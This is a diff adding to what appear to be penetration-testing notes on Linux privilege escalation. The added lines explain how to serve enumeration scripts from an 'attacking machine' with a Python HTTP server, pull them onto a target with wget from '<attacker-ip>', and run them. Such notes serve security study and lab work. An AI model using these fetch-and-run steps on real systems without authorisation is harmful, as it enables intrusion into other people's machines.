@@ -21,6 +21,24 @@
 * [LES](https://github.com/mzet-/linux-exploit-suggester).
 * [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
 * [Linux Priv Checker](https://github.com/linted/linuxprivchecker).
+
+> To send any of these scripts to a target machine, spawn a python server on the attacking machine where the script is:
+```bash
+python -m http.server 80
+```
+
+> Then `wget` the script.
+```shell
+wget http://<attacker-ip>:80/<scriptname.sh>
+```
+
+> Before running the script, give it first execute permissions then run it.
+
+```shell
+chmod +x <scriptname.sh>
+./scriptname.sh
+```
+
 #### Enumeration
 
 ##### Hostname
